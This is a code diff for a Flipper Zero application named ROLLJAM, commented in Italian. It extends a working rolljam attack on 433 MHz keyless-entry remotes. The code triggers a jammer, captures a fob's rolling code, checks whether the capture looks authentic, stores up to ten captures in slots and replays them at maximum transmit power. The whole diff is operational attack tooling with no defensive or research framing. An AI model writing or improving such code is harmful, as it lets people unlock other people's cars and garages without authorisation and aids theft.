@@ -85,12 +85,28 @@ static void rj_beacon_off(void) {
 #define ROLLJAM_LOG_FILE        EXT_PATH("subghz/rolljam/debug.log")
 #define ROLLJAM_FREQ_RX         433920000UL
 #define ROLLJAM_FREQ_JAM        434100000UL
+#define ROLLJAM_SLOTS_MAX       10
+#define ROLLJAM_PRESET_FILE     EXT_PATH("subghz/rolljam/.preset")
+#define ROLLJAM_LAST_SLOT_FILE  EXT_PATH("subghz/rolljam/.last_slot")
+#define ROLLJAM_PRESET_COUNT    4
+static const char* PRESET_NAMES[ROLLJAM_PRESET_COUNT] = {
+    "OOK 650 (def)", "OOK 270", "2FSK 2.38k", "2FSK 4.76k"
+};
+static FuriHalSubGhzPreset preset_lookup(uint8_t i) {
+    switch(i) {
+    case 0: return FuriHalSubGhzPresetOok650Async;
+    case 1: return FuriHalSubGhzPresetOok270Async;
+    case 2: return FuriHalSubGhzPreset2FSKDev238Async;
+    case 3: return FuriHalSubGhzPreset2FSKDev476Async;
+    default: return FuriHalSubGhzPresetOok650Async;
+    }
+}
 
 #define ROLLJAM_JAM_DURATION_MS 5
 #define ROLLJAM_RX_WINDOW_MS    60
 #define ROLLJAM_RX_EXTEND_MS    80
 #define ROLLJAM_MAX_SESSION_MS  15000
-#define ROLLJAM_RX_MIN_EDGES    300  /* alto per ignorare rumore, richiede vero keyfob */
+#define ROLLJAM_RX_MIN_EDGES    300
 #define ROLLJAM_MAX_TIMINGS     2048
 
 #define FOB_TIMING_MIN_US       40
@@ -173,6 +189,10 @@ typedef struct {
     RollJamState state;
     bool has_capture;
     uint8_t captured_count;
+    uint8_t current_slot;
+    uint8_t total_slots;
+    uint8_t next_save_slot;
+    uint8_t preset_idx;
     char status_line[48];
     CaptureCtx capture;
     volatile uint16_t replay_index;
@@ -206,21 +226,21 @@ static void draw_cb(Canvas* canvas, void* ctx) {
 
     switch(app->state) {
     case StateReady:
-        canvas_draw_str_aligned(canvas, 64, 10, AlignCenter, AlignCenter, "ROLLJAM v2");
+        canvas_draw_str_aligned(canvas, 64, 7, AlignCenter, AlignCenter, "ROLLJAM");
+        canvas_draw_line(canvas, 0, 12, 127, 12);
         canvas_set_font(canvas, FontSecondary);
-        canvas_draw_str_aligned(canvas, 64, 24, AlignCenter, AlignCenter,
-                                app->device_is_external ? "radio: ESTERNA" : "radio: interna");
-        canvas_draw_str_aligned(canvas, 64, 36, AlignCenter, AlignCenter,
-                                "OK = attacco (jam+rx)");
-        if(app->has_capture) {
-            canvas_draw_str_aligned(canvas, 64, 48, AlignCenter, AlignCenter,
-                                    "v = replay");
+        canvas_draw_str_aligned(canvas, 64, 20, AlignCenter, AlignCenter, PRESET_NAMES[app->preset_idx]);
+        if(app->status_line[0] != '\0') {
+            canvas_draw_str_aligned(canvas, 64, 30, AlignCenter, AlignCenter, app->status_line);
         }
-        if(app->captured_count > 0) {
-            char buf[32];
-            snprintf(buf, sizeof(buf), "catture: %u", app->captured_count);
-            canvas_draw_str_aligned(canvas, 64, 60, AlignCenter, AlignCenter, buf);
+        if(app->total_slots > 0) {
+            char r3[40];
+            snprintf(r3, sizeof(r3), "slot %u/%u", app->current_slot, app->total_slots);
+            canvas_draw_str_aligned(canvas, 64, 40, AlignCenter, AlignCenter, r3);
         }
+        canvas_draw_line(canvas, 0, 45, 127, 45);
+        canvas_draw_str_aligned(canvas, 64, 53, AlignCenter, AlignCenter, "OK jam+rx | v replay");
+        canvas_draw_str_aligned(canvas, 64, 62, AlignCenter, AlignCenter, "<>slot  ^preset");
         break;
 
     case StateRunning:
@@ -288,12 +308,12 @@ static bool radio_init_for_attack(RollJamApp* app) {
              (void*)app->device, (void*)app->txrx_worker);
     log_add(_dbg_init);
 
-    /* FORZA INTERNAL CC1101 — TX 10mW stabile, no external board, no OTG */
+    /* FORZA INTERNAL CC1101 — TX 10mW stabile, no external, no OTG */
     if(!app->device) {
         if(furi_hal_power_is_otg_enabled()) furi_hal_power_disable_otg();
         app->device = radio_device_loader_set(NULL, SubGhzRadioDeviceTypeInternal);
         app->device_is_external = false;
-        log_add("FORCED INTERNAL CC1101 (10mW max stable)");
+        log_add("FORCED INTERNAL CC1101 (10mW max)");
     }
     if(!app->device) {
         log_add("radio_init FAILED: no device");
@@ -306,7 +326,7 @@ static bool radio_init_for_attack(RollJamApp* app) {
     log_add("pre-idle");
     subghz_devices_idle(app->device);
     log_add("pre-preset");
-    subghz_devices_load_preset(app->device, FuriHalSubGhzPresetOok650Async, NULL);
+    subghz_devices_load_preset(app->device, preset_lookup(app->preset_idx), NULL);
     log_add("preset OK");
 
     /* Internal CC1101: prepare for RX */
@@ -394,7 +414,7 @@ static void rx_internal_start(RollJamApp* app) {
     if(!app->device) return;
     /* RX su board ESTERNA (alta sensibilità LNA + antenna separata) */
     subghz_devices_idle(app->device);
-    subghz_devices_load_preset(app->device, FuriHalSubGhzPresetOok650Async, NULL);
+    subghz_devices_load_preset(app->device, preset_lookup(app->preset_idx), NULL);
     subghz_devices_set_frequency(app->device, ROLLJAM_FREQ_RX);
     subghz_devices_start_async_rx(app->device, capture_callback, &app->capture);
 }
@@ -418,9 +438,40 @@ static void beep_capture(void) {
 
 /* ---------- Save / Load ---------- */
 
+/* Slot helpers */
+static void slot_path(uint8_t slot, char* out, size_t out_len) {
+    snprintf(out, out_len, "%s/capture_%03u.sub", ROLLJAM_STORAGE_DIR, slot);
+}
+static bool load_slot(RollJamApp* app, uint8_t slot);
+static void rescan_slots(RollJamApp* app) {
+    app->total_slots = 0;
+    char p[96];
+    for(uint8_t i = 1; i <= ROLLJAM_SLOTS_MAX; i++) {
+        slot_path(i, p, sizeof(p));
+        if(storage_common_exists(app->storage, p)) app->total_slots = i;
+    }
+    app->next_save_slot = (app->total_slots < ROLLJAM_SLOTS_MAX) ? (app->total_slots + 1) : 1;
+}
+
+static bool validate_capture(RollJamApp* app) {
+    uint16_t n = app->capture.timings_len;
+    if(n < 100 || n > 1500) return false;
+    uint16_t sync = 0, bits = 0;
+    int hi=0, lo=0;
+    for(uint16_t i = 0; i < n; i++) {
+        uint32_t d = app->capture.timings[i];
+        if(d > 1000) sync++;
+        else if(d >= 100 && d <= 500) bits++;
+        if(app->capture.levels[i]) hi++; else lo++;
+    }
+    int hl = (hi>lo)?(hi-lo):(lo-hi);
+    return sync >= 2 && (bits*100)/n >= 50 && (hl*100)/n <= 25;
+}
+
 static bool save_capture(RollJamApp* app) {
     Stream* stream = file_stream_alloc(app->storage);
-    if(!file_stream_open(stream, ROLLJAM_LAST_SUB, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
+    char slot_p[96]; slot_path(app->next_save_slot, slot_p, sizeof(slot_p));
+    if(!file_stream_open(stream, slot_p, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
         stream_free(stream);
         return false;
     }
@@ -468,9 +519,66 @@ static bool save_capture(RollJamApp* app) {
     }
 
     char buf[48];
-    snprintf(buf, sizeof(buf), "SAVED %u edges (raw %u)", kept, n_raw);
+    snprintf(buf, sizeof(buf), "SAVED slot=%u edges=%u (raw %u)",
+             app->next_save_slot, kept, n_raw);
     log_add(buf);
+    if(kept > 0) {
+        app->current_slot = app->next_save_slot;
+        if(app->total_slots < app->next_save_slot) app->total_slots = app->next_save_slot;
+        app->next_save_slot = (app->next_save_slot >= ROLLJAM_SLOTS_MAX) ? 1 : (app->next_save_slot + 1);
+    }
     return kept > 0;
+}
+
+/* Carica capture da slot N, popola app->capture */
+static bool load_slot(RollJamApp* app, uint8_t slot) {
+    if(slot < 1 || slot > ROLLJAM_SLOTS_MAX) return false;
+    char path[96]; slot_path(slot, path, sizeof(path));
+    Stream* stream = file_stream_alloc(app->storage);
+    bool ok = false;
+    if(file_stream_open(stream, path, FSAM_READ, FSOM_OPEN_EXISTING)) {
+        app->capture.timings_len = 0;
+        char line_buf[32]; bool found = false;
+        while(!found) {
+            size_t pos = 0;
+            while(pos < sizeof(line_buf) - 1) {
+                uint8_t ch;
+                if(stream_read(stream, &ch, 1) != 1) goto end;
+                if(ch == '\n') break;
+                line_buf[pos++] = (char)ch;
+            }
+            line_buf[pos] = '\0';
+            if(strncmp(line_buf, "RAW_Data:", 9) == 0) found = true;
+        }
+        if(!found) goto end;
+        char num[16]; uint8_t ni = 0; bool reading = true;
+        while(reading && app->capture.timings_len < ROLLJAM_MAX_TIMINGS) {
+            uint8_t ch;
+            if(stream_read(stream, &ch, 1) != 1) { reading = false; ch = ' '; }
+            if(ch == ' ' || ch == '\n' || ch == '\r') {
+                if(ni > 0) {
+                    num[ni] = '\0';
+                    long val = strtol(num, NULL, 10);
+                    if(val != 0) {
+                        uint16_t idx = app->capture.timings_len;
+                        app->capture.levels[idx] = val > 0;
+                        app->capture.timings[idx] = (uint32_t)(val > 0 ? val : -val);
+                        app->capture.timings_len++;
+                    }
+                    ni = 0;
+                }
+                if(ch == '\n') reading = false;
+            } else {
+                if(ni < sizeof(num) - 1) num[ni++] = (char)ch;
+            }
+        }
+end:
+        file_stream_close(stream);
+        ok = app->capture.timings_len > 0;
+    }
+    stream_free(stream);
+    if(ok) { app->current_slot = slot; app->has_capture = true; }
+    return ok;
 }
 
 static bool load_last_capture(RollJamApp* app) {
@@ -530,13 +638,11 @@ done:
 
 static bool run_attack(RollJamApp* app) {
     log_add("=== ATTACK START ===");
-    rj_beacon_set(RJ_BEACON_STATE_ON_433);  /* segnale a Pi Zero: jam ON 433 MHz */
-    log_add("BEACON ON_433");
-    /* Attendi 2s che pichirp Pi Zero parta — startup rpitx ~1.5s */
-    log_add("waiting 2s pichirp warmup");
+    rj_beacon_set(RJ_BEACON_STATE_ON_433);
+    log_add("BEACON ON_433 — warmup 2s pichirp");
     log_flush(g_log_storage);
     furi_delay_ms(2000);
-    log_add("warmup done, starting RX");
+    log_add("warmup done, RX inizio");
     log_flush(g_log_storage);
     app->should_abort = false;
     app->jam_count = 0;
@@ -634,12 +740,12 @@ static void do_replay(RollJamApp* app) {
     app->replay_index = 0;
     app->replay_done = false;
 
-    /* Replay: re-inizializza preset + force PATABLE max +10 dBm per internal CC1101 */
+    /* Replay: re-inizializza explicit preset+PATABLE prima async_tx per full 1W
+     * (worker precedente può aver modificato stato) */
     subghz_devices_reset(app->device);
     subghz_devices_idle(app->device);
-    subghz_devices_load_preset(app->device, FuriHalSubGhzPresetOok650Async, NULL);
+    subghz_devices_load_preset(app->device, preset_lookup(app->preset_idx), NULL);
     subghz_devices_set_frequency(app->device, ROLLJAM_FREQ_RX);
-    /* Force PATABLE max (0xC0 = +10 dBm) — ridondante ma garantisce TX consistente */
     static const uint8_t patable_max[8] = {0xC0, 0, 0, 0, 0, 0, 0, 0};
     furi_hal_subghz_load_patable(patable_max);
     log_add("REPLAY preset+freq+PATABLE_MAX set");
@@ -692,7 +798,10 @@ static void handle_key(RollJamApp* app, InputEvent* input) {
                 beep_capture();
                 app->has_capture = true;
                 app->captured_count++;
-                log_add("CAPTURE SAVED + BEEP");
+                bool autentico = validate_capture(app);
+                set_status(app, autentico ? "AUTENTICO ✓" : "rumore?");
+                log_add(autentico ? "CAPTURE SAVED + AUTENTICO" : "CAPTURE SAVED + sospetto");
+                furi_delay_ms(2500);
             } else if(!app->should_abort) {
                 set_status(app, "nessun segnale");
                 log_add("NO SIGNAL");
@@ -700,6 +809,35 @@ static void handle_key(RollJamApp* app, InputEvent* input) {
             radio_deinit_attack(app);
             log_flush(app->storage);
             app->state = StateReady;
+            view_port_update(app->view_port);
+        } else if(input->key == InputKeyLeft && app->total_slots > 1) {
+            if(app->current_slot > 1 && load_slot(app, app->current_slot - 1)) {
+                Stream* st = file_stream_alloc(app->storage);
+                if(file_stream_open(st, ROLLJAM_LAST_SLOT_FILE, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
+                    char b[8]; snprintf(b, sizeof(b), "%u\n", app->current_slot);
+                    stream_write_cstring(st, b); file_stream_close(st);
+                }
+                stream_free(st);
+                view_port_update(app->view_port);
+            }
+        } else if(input->key == InputKeyRight && app->total_slots > 1) {
+            if(app->current_slot < app->total_slots && load_slot(app, app->current_slot + 1)) {
+                Stream* st = file_stream_alloc(app->storage);
+                if(file_stream_open(st, ROLLJAM_LAST_SLOT_FILE, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
+                    char b[8]; snprintf(b, sizeof(b), "%u\n", app->current_slot);
+                    stream_write_cstring(st, b); file_stream_close(st);
+                }
+                stream_free(st);
+                view_port_update(app->view_port);
+            }
+        } else if(input->key == InputKeyUp) {
+            app->preset_idx = (app->preset_idx + 1) % ROLLJAM_PRESET_COUNT;
+            Stream* st = file_stream_alloc(app->storage);
+            if(file_stream_open(st, ROLLJAM_PRESET_FILE, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
+                char b[8]; snprintf(b, sizeof(b), "%u\n", app->preset_idx);
+                stream_write_cstring(st, b); file_stream_close(st);
+            }
+            stream_free(st);
             view_port_update(app->view_port);
         } else if(input->key == InputKeyDown && app->has_capture) {
             log_add("KEY DOWN -> REPLAY");
@@ -762,8 +900,38 @@ static RollJamApp* app_alloc(void) {
     a->device = NULL;
     a->device_is_external = false;
 
-    /* Auto-load last.sub if exists */
-    if(load_last_capture(a)) {
+    /* Carica preset salvato */
+    a->preset_idx = 0;
+    {
+        Stream* st = file_stream_alloc(a->storage);
+        if(file_stream_open(st, ROLLJAM_PRESET_FILE, FSAM_READ, FSOM_OPEN_EXISTING)) {
+            uint8_t ch;
+            if(stream_read(st, &ch, 1) == 1 && ch >= '0' && ch <= '9') {
+                uint8_t v = ch - '0';
+                if(v < ROLLJAM_PRESET_COUNT) a->preset_idx = v;
+            }
+            file_stream_close(st);
+        }
+        stream_free(st);
+    }
+    /* Scan slot + carica .last_slot o ultimo */
+    rescan_slots(a);
+    uint8_t target = a->total_slots;
+    {
+        Stream* st = file_stream_alloc(a->storage);
+        if(file_stream_open(st, ROLLJAM_LAST_SLOT_FILE, FSAM_READ, FSOM_OPEN_EXISTING)) {
+            char b[8] = {0}; uint8_t bi = 0; uint8_t ch;
+            while(bi < 4 && stream_read(st, &ch, 1) == 1 && ch >= '0' && ch <= '9') b[bi++] = (char)ch;
+            b[bi] = '\0';
+            long v = strtol(b, NULL, 10);
+            if(v >= 1 && v <= a->total_slots) target = (uint8_t)v;
+            file_stream_close(st);
+        }
+        stream_free(st);
+    }
+    if(a->total_slots > 0 && load_slot(a, target)) {
+        /* slot ripristinato */
+    } else if(load_last_capture(a)) {
         a->has_capture = true;
     }
     return a;
